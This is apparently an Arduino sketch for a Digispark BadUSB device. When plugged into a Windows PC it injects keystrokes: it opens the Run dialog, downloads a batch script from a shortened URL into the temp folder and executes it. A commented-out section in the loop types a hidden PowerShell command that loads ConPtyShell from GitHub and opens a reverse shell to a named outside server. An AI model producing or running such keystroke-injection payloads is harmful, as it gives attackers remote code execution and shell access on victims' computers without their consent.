#define LAYOUT_GERMAN
#include "DigiKeyboard.h"

void setup() {
  delay(50);
  DigiKeyboard.disableLEDFeedback();

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200); 

  DigiKeyboard.print("cmd /c curl -sL \"rb.gy/p5t1cu\" -o %TEMP%");
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_ALT_RIGHT);
  DigiKeyboard.print("rs.cmd && %TEMP%");
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_ALT_RIGHT);
  DigiKeyboard.println("rs.cmd");

  DigiKeyboard.write('\n');
}


void loop() {
  /*DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Simulira pritisak Win + R i otvara run
  DigiKeyboard.delay(200); 

  DigiKeyboard.println("powershell"); // Otvara powershell
  DigiKeyboard.delay(200);

  DigiKeyboard.println("powershell -WindowStyle Hidden -Command \"IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell (Resolve-DnsName jangosserver.eu).IPAddress 87\""); // Ispise komandu za spajanje na listener
  DigiKeyboard.enableLEDFeedback();

  DigiKeyboard.delay(5000);*/
}
